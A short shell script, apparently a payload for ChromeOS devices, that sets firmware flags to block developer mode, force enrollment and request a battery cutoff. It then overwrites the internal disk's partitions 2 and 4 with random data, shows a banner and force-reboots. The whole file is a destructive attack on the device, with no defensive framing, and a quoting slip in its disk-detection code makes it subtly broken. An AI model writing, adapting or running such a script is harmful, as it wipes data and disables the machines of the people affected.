#!/bin/sh
echo "starting persistence in fanxql injection..."

vpd -i RW_VPD -s block_devmode=1 >/dev/null 2>&1
vpd -i RW_VPD -s check_enrollment=1 >/dev/null 2>&1
crossystem block_devmode=1 >/dev/null 2>&1
crossystem battery_cutoff_request=1 >/dev/null 2>&1

get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}
TARGET_DEVICE=$(get_fixed_dst_drive)
if echo "$TARGET_DEVICE" | grep -q '[0-9]$'; then
	TARGET_DEVICE_P="$TARGET_DEVICE"p
else
	TARGET_DEVICE_P="$TARGET_DEVICE"
fi
dd if=/dev/urandom of="$TARGET_DEVICE_P"2 >/dev/null 2>&1 # tuff!
dd if=/dev/urandom of="$TARGET_DEVICE_P"4 >/dev/null 2>&1
echo "Done!" 
sleep 4
clear
cat "$PAYLOAD_DIR/whale.txt"
sleep 0.3
reboot -f
